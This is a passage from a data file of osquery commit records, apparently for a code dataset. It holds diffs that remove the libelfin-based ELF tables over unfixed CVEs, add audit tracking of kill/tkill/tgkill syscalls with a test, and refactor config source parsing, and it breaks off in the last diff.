    -        std::vector<std::string> patterns;

    -        auto status =

    -            resolveFilePattern(pattern, patterns, GLOB_ALL | GLOB_NO_CANON);

    -        if (status.ok()) {

    -          for (const auto& resolved : patterns) {

    -            out.insert(resolved);

    -          }

    -        }

    -        return status;

    -      }));

    -

    -  for (const auto& path : paths) {

    -    auto fd = open(path.c_str(), O_RDONLY);

    -    if (fd >= 0) {

    -      try {

    -        elf::elf f(elf::create_mmap_loader(fd));

    -        predicate(f, path);

    -      } catch (const std::exception& e) {

    -        VLOG(1) << "Could not read ELF header: " << path;

    -      }

    -      close(fd);

    -    }

    -  }

    -}

    -

    -QueryData getELFInfo(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    const auto& hdr = f.get_hdr();

    -

    -    Row r;

    -    r["path"] = path;

    -    r["class"] = (hdr.ei_class == elf::elfclass::_32) ? "32" : "64";

    -    r["abi"] = to_string(hdr.ei_osabi);

    -    r["abi_version"] = std::to_string(hdr.ei_abiversion);

    -    r["type"] = to_string(hdr.type);

    -    r["machine"] = std::to_string(hdr.machine);

    -    r["version"] = std::to_string(hdr.version);

    -    r["entry"] = std::to_string(hdr.entry);

    -    r["flags"] = std::to_string(hdr.flags);

    -    results.push_back(r);

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFSegments(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& seg : f.segments()) {

    -      const auto& hdr = seg.get_hdr();

    -

    -      Row r;

    -      r["path"] = path;

    -      auto gnu_type =

    -          kGNUTypes.find(static_cast<elf::ElfTypes::Word>(hdr.type));

    -      if (gnu_type != kGNUTypes.end()) {

    -        r["name"] = gnu_type->second;

    -      } else {

    -        r["name"] = to_string(hdr.type);

    -      }

    -      r["offset"] = std::to_string(hdr.offset);

    -      r["vaddr"] = std::to_string(hdr.vaddr);

    -      r["flags"] = to_string(hdr.flags);

    -      r["psize"] = std::to_string(hdr.filesz);

    -      r["msize"] = std::to_string(hdr.memsz);

    -      r["align"] = std::to_string(hdr.align);

    -      results.push_back(r);

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFSymbols(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& sec : f.sections()) {

    -      const auto& hdr = sec.get_hdr();

    -

    -      if (hdr.type != elf::sht::symtab && hdr.type != elf::sht::dynsym) {

    -        continue;

    -      }

    -

    -      Row r;

    -      r["path"] = path;

    -      r["table"] = sec.get_name();

    -

    -      for (const auto& sym : sec.as_symtab()) {

    -        const auto& d = sym.get_data();

    -        r["addr"] = std::to_string(d.value);

    -        r["size"] = std::to_string(d.size);

    -        r["type"] = to_string(d.type());

    -        r["binding"] = to_string(d.binding());

    -        r["offset"] = to_string(d.shnxd);

    -        r["name"] = sym.get_name();

    -        results.push_back(r);

    -      }

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFSections(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& sec : f.sections()) {

    -      const auto& hdr = sec.get_hdr();

    -

    -      Row r;

    -      r["path"] = path;

    -      r["name"] = sec.get_name();

    -      r["type"] = std::to_string(static_cast<elf::ElfTypes::Word>(hdr.type));

    -      r["addr"] = std::to_string(hdr.addr);

    -      r["offset"] = std::to_string(hdr.offset);

    -      r["size"] = std::to_string(hdr.size);

    -      r["flags"] = to_string(hdr.flags);

    -      r["link"] = to_string(hdr.link);

    -      r["align"] = std::to_string(hdr.addralign);

    -      results.push_back(r);

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -QueryData getELFDynamic(QueryContext& context) {

    -  QueryData results;

    -

    -  auto lambda = [&results](const elf::elf& f, const std::string& path) {

    -    for (const auto& sec : f.sections()) {

    -      const auto& hdr = sec.get_hdr();

    -      if (hdr.type != elf::sht::dynamic) {

    -        continue;

    -      }

    -

    -      Row r;

    -      r["path"] = path;

    -      const auto* data = sec.data();

    -      if (f.get_hdr().ei_class == elf::elfclass::_32) {

    -        r["class"] = "32";

    -        auto* dynamic = reinterpret_cast<const Elf32_Dyn*>(data);

    -        for (const auto* d = dynamic; d->d_tag != DT_NULL; ++d) {

    -          r["tag"] = std::to_string(d->d_tag);

    -          r["value"] = std::to_string(d->d_un.d_val);

    -          results.push_back(r);

    -        }

    -      } else {

    -        r["class"] = "64";

    -        auto* dynamic = reinterpret_cast<const Elf64_Dyn*>(data);

    -        for (const auto* d = dynamic; d->d_tag != DT_NULL; ++d) {

    -          r["tag"] = std::to_string(d->d_tag);

    -          r["value"] = std::to_string(d->d_un.d_val);

    -          results.push_back(r);

    -        }

    -      }

    -    }

    -  };

    -

    -  genElfInfo(context, lambda);

    -  return results;

    -}

    -

    -} // namespace tables

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_dynamic.cpp

    +++ b/tests/integration/tables/elf_dynamic.cpp

    @@ -1,46 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_dynamic

    -// Spec file: specs/linux/elf_dynamic.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfDynamic : public testing::Test {

    - protected:

    -  void SetUp() override {

    -    setUpEnvironment();

    -  }

    -};

    -

    -TEST_F(elfDynamic, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_dynamic where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"tag", IntType}

    -  //      {"value", IntType}

    -  //      {"class", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_info.cpp

    +++ b/tests/integration/tables/elf_info.cpp

    @@ -1,51 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_info

    -// Spec file: specs/linux/elf_info.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfInfo : public testing::Test {

    - protected:

    -  void SetUp() override {

    -    setUpEnvironment();

    -  }

    -};

    -

    -TEST_F(elfInfo, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_info where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"class", NormalType}

    -  //      {"abi", NormalType}

    -  //      {"abi_version", IntType}

    -  //      {"type", NormalType}

    -  //      {"machine", IntType}

    -  //      {"version", IntType}

    -  //      {"entry", IntType}

    -  //      {"flags", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_sections.cpp

    +++ b/tests/integration/tables/elf_sections.cpp

    @@ -1,51 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_sections

    -// Spec file: specs/linux/elf_sections.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfSections : public testing::Test {

    - protected:

    -  void SetUp() override {

    -    setUpEnvironment();

    -  }

    -};

    -

    -TEST_F(elfSections, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_sections where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"name", NormalType}

    -  //      {"type", IntType}

    -  //      {"vaddr", IntType}

    -  //      {"offset", IntType}

    -  //      {"size", IntType}

    -  //      {"flags", NormalType}

    -  //      {"link", NormalType}

    -  //      {"align", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_segments.cpp

    +++ b/tests/integration/tables/elf_segments.cpp

    @@ -1,50 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_segments

    -// Spec file: specs/linux/elf_segments.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfSegments : public testing::Test {

    -  protected:

    -    void SetUp() override {

    -      setUpEnvironment();

    -    }

    -};

    -

    -TEST_F(elfSegments, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_segments where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"name", NormalType}

    -  //      {"offset", IntType}

    -  //      {"vaddr", IntType}

    -  //      {"psize", IntType}

    -  //      {"msize", IntType}

    -  //      {"flags", NormalType}

    -  //      {"align", IntType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  - '--- a/tests/integration/tables/elf_symbols.cpp

    +++ b/tests/integration/tables/elf_symbols.cpp

    @@ -1,50 +0,0 @@

    -/**

    - * Copyright (c) 2014-present, The osquery authors

    - *

    - * This source code is licensed as defined by the LICENSE file found in the

    - * root directory of this source tree.

    - *

    - * SPDX-License-Identifier: (Apache-2.0 OR GPL-2.0-only)

    - */

    -

    -// Sanity check integration test for elf_symbols

    -// Spec file: specs/linux/elf_symbols.table

    -

    -#include <osquery/tests/integration/tables/helper.h>

    -

    -namespace osquery {

    -namespace table_tests {

    -

    -class elfSymbols : public testing::Test {

    -  protected:

    -    void SetUp() override {

    -      setUpEnvironment();

    -    }

    -};

    -

    -TEST_F(elfSymbols, test_sanity) {

    -  // 1. Query data

    -  auto const data = execute_query("select * from elf_symbols where path = ''''");

    -  // 2. Check size before validation

    -  // ASSERT_GE(data.size(), 0ul);

    -  // ASSERT_EQ(data.size(), 1ul);

    -  // ASSERT_EQ(data.size(), 0ul);

    -  // 3. Build validation map

    -  // See helper.h for available flags

    -  // Or use custom DataCheck object

    -  // ValidationMap row_map = {

    -  //      {"name", NormalType}

    -  //      {"addr", IntType}

    -  //      {"size", IntType}

    -  //      {"type", NormalType}

    -  //      {"binding", NormalType}

    -  //      {"offset", IntType}

    -  //      {"table", NormalType}

    -  //      {"path", NormalType}

    -  //}

    -  // 4. Perform validation

    -  // validate_rows(data, row_map);

    -}

    -

    -} // namespace table_tests

    -} // namespace osquery'
  commit_message: "Remove libelfin and elf parsing tables (#7524)\n\nDue to libelfin\
    \ being unmaintained and containing unfixed CVEs,\r\nremove the library and the\
    \ following tables that depends on it:\r\nelf_dynamic, elf_info, elf_sections,\
    \ elf_segments, elf_symbols."
  commit_sha: b5ea437d31e2154dffeae39f8fc47a9d63ecb749
  repo_name: osquery/osquery
- commit_diff:
  - "--- a/osquery/events/linux/auditdnetlink.cpp\n+++ b/osquery/events/linux/auditdnetlink.cpp\n\
    @@ -58,6 +58,7 @@ DECLARE_bool(audit_allow_config);\n DECLARE_bool(audit_allow_fim_events);\n\
    \ DECLARE_bool(audit_allow_process_events);\n DECLARE_bool(audit_allow_fork_process_events);\n\
    +DECLARE_bool(audit_allow_kill_process_events);\n DECLARE_bool(audit_allow_sockets);\n\
    \ DECLARE_bool(audit_allow_user_events);\n DECLARE_bool(audit_allow_selinux_events);\n\
    @@ -348,6 +349,14 @@ bool AuditdNetlinkReader::configureAuditService() noexcept\
    \ {\n         monitored_syscall_list_.insert(syscall);\n       }\n     }\n+\n\
    +    if (FLAGS_audit_allow_kill_process_events) {\n+      VLOG(1) << \"Enabling\
    \ audit rules for the process_events (kill, tkill, \"\n+                 \"tgkill)\
    \ table\";\n+      for (int syscall : kKillProcessEventsSyscalls) {\n+       \
    \ monitored_syscall_list_.insert(syscall);\n+      }\n+    }\n   }\n \n   // Rules\
    \ required by the process_file_events table"
  - "--- a/osquery/events/linux/auditeventpublisher.cpp\n+++ b/osquery/events/linux/auditeventpublisher.cpp\n\
    @@ -24,6 +24,7 @@ DECLARE_bool(audit_allow_process_events);\n DECLARE_bool(audit_allow_sockets);\n\
    \ DECLARE_bool(audit_allow_user_events);\n DECLARE_bool(audit_allow_selinux_events);\n\
    +DECLARE_bool(audit_allow_kill_process_events);\n \n REGISTER(AuditEventPublisher,\
    \ \"event_publisher\", \"auditeventpublisher\");\n \n@@ -35,7 +36,8 @@ bool IsPublisherEnabled()\
    \ noexcept {\n \n   return (FLAGS_audit_allow_fim_events || FLAGS_audit_allow_process_events\
    \ ||\n           FLAGS_audit_allow_sockets || FLAGS_audit_allow_user_events ||\n\
    -          FLAGS_audit_allow_selinux_events);\n+          FLAGS_audit_allow_selinux_events\
    \ ||\n+          FLAGS_audit_allow_kill_process_events);\n }\n } // namespace\n\
    \ "
  - "--- a/osquery/tables/events/linux/process_events.cpp\n+++ b/osquery/tables/events/linux/process_events.cpp\n\
    @@ -22,8 +22,11 @@ const std::unordered_map<int, std::string> kSyscallNameMap\
    \ = {\n     {__NR_execveat, \"execveat\"},\n     {__NR_fork, \"fork\"},\n    \
    \ {__NR_vfork, \"vfork\"},\n-    {__NR_clone, \"clone\"}};\n-}\n+    {__NR_clone,\
    \ \"clone\"},\n+    {__NR_kill, \"kill\"},\n+    {__NR_tkill, \"tkill\"},\n+ \
    \   {__NR_tgkill, \"tgkill\"}};\n+};\n \n DECLARE_bool(audit_allow_process_events);\n\
    \ \n@@ -33,6 +36,12 @@ FLAG(bool,\n      \"Allow the audit publisher to install\
    \ process event monitoring rules to \"\n      \"capture fork/vfork/clone system\
    \ calls\");\n \n+FLAG(bool,\n+     audit_allow_kill_process_events,\n+     false,\n\
    +     \"Allow the audit publisher to install process event monitoring rules to\
    \ \"\n+     \"capture kill/tkill/tgkill system calls\");\n+\n REGISTER(AuditProcessEventSubscriber,\
    \ \"event_subscriber\", \"process_events\");\n \n Status AuditProcessEventSubscriber::init()\
    \ {\n@@ -124,13 +133,18 @@ Status AuditProcessEventSubscriber::ProcessEvents(\n\
    \     const auto& event_data = boost::get<SyscallAuditEventData>(event.data);\n\
    \ \n     bool is_exec_syscall{false};\n+    bool is_kill_syscall{false};\n   \
    \  if (kExecProcessEventsSyscalls.count(event_data.syscall_number) > 0U) {\n \
    \      is_exec_syscall = true;\n \n     } else if (kForkProcessEventsSyscalls.count(event_data.syscall_number)\
    \ >\n                0U) {\n       is_exec_syscall = false;\n \n+    } else if\
    \ (kKillProcessEventsSyscalls.count(event_data.syscall_number) >\n+          \
    \     0U) {\n+      is_kill_syscall = true;\n+\n     } else {\n       continue;\n\
    \     }\n@@ -212,6 +226,17 @@ Status AuditProcessEventSubscriber::ProcessEvents(\n\
    \         continue;\n       }\n \n+    } else if (is_kill_syscall) {\n+      const\
    \ AuditEventRecord* obj_pid_recod =\n+          GetEventRecord(event, AUDIT_OBJ_PID);\n\
    +\n+      CopyFieldFromMap(row, syscall_event_record->fields, \"tty\", \"\");\n\
    +      CopyFieldFromMap(row, syscall_event_record->fields, \"ses\", \"-1\");\n\
    +      CopyFieldFromMap(row, syscall_event_record->fields, \"comm\", \"\");\n\
    +      CopyFieldFromMap(row, obj_pid_recod->fields, \"ocomm\", \"-1\");\n+   \
    \   CopyFieldFromMap(row, obj_pid_recod->fields, \"oses\", \"-1\");\n+      CopyFieldFromMap(row,\
    \ obj_pid_recod->fields, \"oauid\", \"-1\");\n+\n     } else {\n       row[\"\
    owner_uid\"] = \"0\";\n       row[\"owner_gid\"] = \"0\";"
  - "--- a/osquery/tables/events/tests/linux/process_events_tests.cpp\n+++ b/osquery/tables/events/tests/linux/process_events_tests.cpp\n\
    @@ -90,9 +90,10 @@ void GenerateEventRow(Row& row, const RawAuditEvent& audit_event)\
    \ {\n class ProcessEventsTests : public testing::Test {};\n \n TEST_F(ProcessEventsTests,\
    \ syscall_name_label) {\n-  ASSERT_EQ(\n-      kExecProcessEventsSyscalls.size()\
    \ + kForkProcessEventsSyscalls.size(),\n-      AuditProcessEventSubscriber::GetSyscallNameMap().size());\n\
    +  ASSERT_EQ(kExecProcessEventsSyscalls.size() +\n+                kForkProcessEventsSyscalls.size()\
    \ +\n+                kKillProcessEventsSyscalls.size(),\n+            AuditProcessEventSubscriber::GetSyscallNameMap().size());\n\
    \ \n   std::string name;\n \n@@ -165,6 +166,59 @@ TEST_F(ProcessEventsTests, exec_event_processing)\
    \ {\n   }\n }\n \n+TEST_F(ProcessEventsTests, kill_syscall_event_processing) {\n\
    +  // clang-format off\n+  const RawAuditEvent kSampleKillEvent = {\n+    { 1300,\
    \ \"audit(1588703361.452:26860): arch=c000003e syscall=62 success=yes exit=0 a0=6334\
    \ a1=f a2=0 a3=7f8b95cbbcc0 items=0 ppid=6198 pid=6199 auid=1000 uid=1000 gid=1000\
    \ euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts3 ses=5\
    \ comm=\\\"bash\\\" exe=\\\"/bin/bash\\\" key=226B696C6C73686F7422\" },\n+   \
    \ { 1318, \"audit(1588703361.452:26860): opid=25396 oauid=1000 ouid=1000 oses=5\
    \ ocomm=\\\"python3\\\"\" },\n+    { 1307, \"audit(1588703361.452:26860): proctitle=\\\
    \"-bash\\\"\" },\n+    { 1320, \"audit(1588703361.452:26860): \" }\n+  };\n+ \
    \ // clang-format on\n+\n+  Row event_row;\n+  GenerateEventRow(event_row, kSampleKillEvent);\n\
    +\n+  const std::vector<std::string> kExpectedFields = {\n+      \"uptime\", \"\
    overflows\", \"env\", \"env_size\", \"env_count\"};\n+\n+  const std::unordered_map<std::string,\
    \ std::string> kExpectedFieldMap = {\n+      {\"syscall\", \"kill\"},\n+     \
    \ {\"parent\", \"6198\"},\n+      {\"pid\", \"6199\"},\n+      {\"auid\", \"1000\"\
    },\n+      {\"uid\", \"1000\"},\n+      {\"gid\", \"1000\"},\n+      {\"euid\"\
    , \"1000\"},\n+      {\"suid\", \"1000\"},\n+      {\"fsuid\", \"1000\"},\n+ \
    \     {\"egid\", \"1000\"},\n+      {\"sgid\", \"1000\"},\n+      {\"fsgid\",\
    \ \"1000\"},\n+      {\"tty\", \"pts3\"},\n+      {\"ses\", \"5\"},\n+      {\"\
    comm\", \"\\\"bash\\\"\"},\n+      {\"path\", \"/bin/bash\"},\n+      {\"ocomm\"\
    , \"\\\"python3\\\"\"},\n+      {\"oauid\", \"1000\"},\n+      {\"oses\", \"5\"\
    }};\n+\n+  for (const auto& key : kExpectedFields) {\n+    EXPECT_TRUE(event_row.find(key)\
    \ != event_row.end());\n+  }\n+\n+  for (const auto& p : kExpectedFieldMap) {\n\
    +    const auto& key = p.first;\n+    const auto& expected_value = p.second;\n\
    +\n+    auto it = event_row.find(key);\n+    ASSERT_TRUE(it != event_row.end());\n\
    +\n+    const auto& actual_value = it->second;\n+    EXPECT_EQ(expected_value,\
    \ actual_value);\n+  }\n+}\n+\n TEST_F(ProcessEventsTests, thread_detection) {\n\
    \   const std::string kThreadCreationSyscallRecord =\n       \"audit(1565632189.127:261722):\
    \ arch=c000003e syscall=56 success=yes \""
  commit_message: "Add support for processing KILL syscall (#6435)\n\nAdd support\
    \ for processing KILL, TKILL and TGKILL syscalls. The first\r\nmessage of the\
    \ SYSCALL message type is handled in a similar way as\r\nEXECVE as the structure\
    \ is more or less the same.\r\n\r\nThree additional fields are parsed from the\
    \ message which are \"ses\"\r\n(session of the process), \"comm\" (the command\
    \ that was executed, eg: the\r\nscript name in case of a /bin/bash invoke) and\
    \ \"tty\" (the controlling\r\nterminal for the process). These fields will not\
    \ be published though\r\nsince the table schema doesn't support it at the moment.\r\
    \n\r\nThe above feature is activated using the\r\n    --audit_allow_kill_process_events=true\r\
    \n\r\nSample columns:\r\n```\r\n\"columns\": {\r\n  \"atime\": \"1589007635\"\
    ,\r\n  \"auid\": \"4294967295\",\r\n  \"btime\": \"0\",\r\n  \"cmdline\": \"\"\
    ,\r\n  \"ctime\": \"1587237608\",\r\n  \"cwd\": \"\",\r\n  \"egid\": \"1000\"\
    ,\r\n  \"euid\": \"1000\",\r\n  \"fsgid\": \"1000\",\r\n  \"fsuid\": \"1000\"\
    ,\r\n  \"gid\": \"1000\",\r\n  \"mode\": \"0755\",\r\n  \"mtime\": \"1586904788\"\
    ,\r\n  \"owner_gid\": \"\",\r\n  \"owner_uid\": \"\",\r\n  \"parent\": \"4781\"\
    ,\r\n  \"path\": \"/home/USERNAME/code-server-3.1.1-linux-x86_64/node\",\r\n \
    \ \"pid\": \"4795\",\r\n  \"sgid\": \"1000\",\r\n  \"suid\": \"1000\",\r\n  \"\
    syscall\": \"kill\",\r\n  \"time\": \"1589052835\",\r\n  \"uid\": \"1000\",\r\n\
    \  \"uptime\": \"26902\"\r\n}\r\n```\r\n\r\nNote that the TGKILL syscall is recommended\
    \ to not be used from the\r\nlinux manpages."
  commit_sha: cd11220b7acbff78ff26a1e33e3009a2b9e69bbb
  repo_name: osquery/osquery
- commit_diff:
  - "--- a/osquery/config/config.cpp\n+++ b/osquery/config/config.cpp\n@@ -11,7 +11,9\
    \ @@\n #include <chrono>\n #include <mutex>\n #include <random>\n-#include <sstream>\n\
    +\n+#include <boost/property_tree/json_parser.hpp>\n+#include <boost/thread/shared_mutex.hpp>\n\
    \ \n #include <osquery/config.h>\n #include <osquery/database.h>\n@@ -40,9 +42,15\
    \ @@ boost::shared_mutex config_files_mutex_;\n boost::shared_mutex config_hash_mutex_;\n\
    \ boost::shared_mutex config_valid_mutex_;\n \n-void Config::addPack(const Pack&\
    \ pack) {\n+void Config::addPack(const std::string& name,\n+                 \
    \    const std::string& source,\n+                     const pt::ptree& tree)\
    \ {\n   WriteLock wlock(config_schedule_mutex_);\n-  return schedule_.add(pack);\n\
    +  try {\n+    schedule_.add(Pack(name, source, tree));\n+  } catch (const std::exception&\
    \ e) {\n+    LOG(WARNING) << \"Error adding pack: \" << name << \": \" << e.what();\n\
    +  }\n }\n \n void Config::removePack(const std::string& pack) {\n@@ -123,6 +131,99\
    \ @@ Status Config::load() {\n   return Status(0, \"OK\");\n }\n \n+Status Config::updateSource(const\
    \ std::string& name, const std::string& json) {\n+  hashSource(name, json);\n\
    +\n+  // load the config (source.second) into a pt::ptree\n+  std::stringstream\
    \ json_stream;\n+  json_stream << json;\n+  pt::ptree tree;\n+  try {\n+    pt::read_json(json_stream,\
    \ tree);\n+  } catch (const pt::json_parser::json_parser_error& e) {\n+    return\
    \ Status(1, \"Error parsing the config JSON\");\n+  }\n+\n+  // extract the \"\
    schedule\" key and store it as the main pack\n+  if (tree.count(\"schedule\")\
    \ > 0) {\n+    auto& schedule = tree.get_child(\"schedule\");\n+    pt::ptree\
    \ main_pack;\n+    main_pack.add_child(\"queries\", schedule);\n+    addPack(\"\
    main\", name, main_pack);\n+  }\n+\n+  if (tree.count(\"scheduledQueries\") >\
    \ 0) {\n+    auto& scheduled_queries = tree.get_child(\"scheduledQueries\");\n\
    +    pt::ptree queries;\n+    for (const std::pair<std::string, pt::ptree>& query\
    \ : scheduled_queries) {\n+      auto query_name = query.second.get<std::string>(\"\
    name\", \"\");\n+      if (query_name.empty()) {\n+        return Status(1, \"\
    Error getting name from legacy scheduled query\");\n+      }\n+      queries.add_child(query_name,\
    \ query.second);\n+    }\n+    pt::ptree legacy_pack;\n+    legacy_pack.add_child(\"\
    queries\", queries);\n+    addPack(\"legacy_main\", name, legacy_pack);\n+  }\n\
    +\n+  // extract the \"packs\" key into additional pack objects\n+  if (tree.count(\"\
    packs\") > 0) {\n+    auto& packs = tree.get_child(\"packs\");\n+    for (const\
    \ auto& pack : packs) {\n+      auto value = packs.get<std::string>(pack.first,\
    \ \"\");\n+      if (value.empty()) {\n+        addPack(pack.first, name, pack.second);\n\
    +      } else {\n+        PluginResponse response;\n+        PluginRequest request\
    \ = {\n+            {\"action\", \"genPack\"}, {\"name\", pack.first}, {\"value\"\
    , value}};\n+        Registry::call(\"config\", request, response);\n+\n+    \
    \    if (response.size() > 0 && response[0].count(pack.first) > 0) {\n+      \
    \    std::stringstream pack_stream;\n+          pack_stream << response[0][pack.first];\n\
    +          pt::ptree pack_tree;\n+          try {\n+            pt::read_json(pack_stream,\
    \ pack_tree);\n+            addPack(pack.first, name, pack_tree);\n+         \
    \ } catch (const pt::json_parser::json_parser_error& e) {\n+            LOG(WARNING)\
    \ << \"Error parsing the pack JSON: \" << pack.first;\n+          }\n+       \
    \ }\n+      }\n+    }\n+  }\n+\n+  for (const auto& plugin : Registry::all(\"\
    config_parser\")) {\n+    std::shared_ptr<ConfigParserPlugin> parser;\n+    try\
    \ {\n+      parser = std::dynamic_pointer_cast<ConfigParserPlugin>(plugin.second);\n\
    +    } catch (const std::bad_cast& e) {\n+      LOG(ERROR) << \"Error casting\
    \ config parser plugin: \" << plugin.first;\n+    }\n+    if (parser == nullptr\
    \ || parser.get() == nullptr) {\n+      continue;\n+    }\n+\n+    // For each\
    \ key requested by the parser, add a property tree reference.\n+    std::map<std::string,\
    \ pt::ptree> parser_config;\n+    for (const auto& key : parser->keys()) {\n+\
    \      if (tree.count(key) > 0) {\n+        parser_config[key] = tree.get_child(key);\n\
    +      } else {\n+        parser_config[key] = pt::ptree();\n+      }\n+    }\n\
    +\n+    // The config parser plugin will receive a copy of each property tree\
    \ for\n+    // each top-level-config key. The parser may choose to update the\
    \ config's\n+    // internal state\n+    parser->update(parser_config);\n+  }\n\
    +  return Status(0, \"OK\");\n+}\n+\n Status Config::update(const std::map<std::string,\
    \ std::string>& config) {\n   // A config plugin may call update from an extension.\
    \ This will update\n   // the config instance within the extension process and\
    \ the update must be\n@@ -142,96 +243,9 @@ Status Config::update(const std::map<std::string,\
    \ std::string>& config) {\n   }\n \n   for (const auto& source : config) {\n-\
    \    hashSource(source.first, source.second);\n-\n-    // load the config (source.second)\
    \ into a pt::ptree\n-    std::stringstream json;\n-    json << source.second;\n\
    -    pt::ptree tree;\n-    try {\n-      pt::read_json(json, tree);\n-    } catch\
    \ (const pt::json_parser::json_parser_error& e) {\n-      return Status(1, \"\
    Error parsing the config JSON. Check the syntax.\");\n-    }\n-\n-    // extract\
    \ the \"schedule\" key and store it as the main pack\n-    if (tree.count(\"schedule\"\
    ) > 0) {\n-      auto& schedule = tree.get_child(\"schedule\");\n-      pt::ptree\
    \ main_pack;\n-      main_pack.add_child(\"queries\", schedule);\n-      addPack(Pack(\"\
    main\", source.first, main_pack));\n-    }\n-\n-    if (tree.count(\"scheduledQueries\"\
    ) > 0) {\n-      auto& scheduled_queries = tree.get_child(\"scheduledQueries\"\
    );\n-      pt::ptree queries;\n-      for (const std::pair<std::string, pt::ptree>&\
    \ query : scheduled_queries) {\n-        auto query_name = query.second.get<std::string>(\"\
    name\", \"\");\n-        if (query_name.empty()) {\n-          return Status(1,\
    \ \"Error getting name from legacy scheduled query\");\n-        }\n-        queries.add_child(query_name,\
    \ query.second);\n-      }\n-      pt::ptree legacy_pack;\n-      legacy_pack.add_child(\"\
    queries\", queries);\n-      addPack(Pack(\"legacy_main\", source.first, legacy_pack));\n\
    -    }\n-\n-    // extract the \"packs\" key into additional pack objects\n- \
    \   if (tree.count(\"packs\") > 0) {\n-      auto& packs = tree.get_child(\"packs\"\
    );\n-      for (const auto& pack : packs) {\n-        auto value = packs.get<std::string>(pack.first,\
    \ \"\");\n-        if (value.empty()) {\n-          addPack(Pack(pack.first, source.first,\
    \ pack.second));\n-        } else {\n-          PluginResponse response;\n-  \
    \        auto status = Registry::call(\n-              \"config\",\n-        \
    \      {{\"action\", \"genPack\"}, {\"name\", pack.first}, {\"value\", value}},\n\
    -              response);\n-          if (!status.ok()) {\n-            return\
    \ status;\n-          }\n-\n-          if (response.size() > 0) {\n-         \
    \   try {\n-              addPack(Pack(pack.first, source.first, response[0][pack.first]));\n\
    -            } catch (const std::exception& e) {\n-              return Status(1,\n\
    -                            \"Error accessing pack plugin response: \" +\n- \
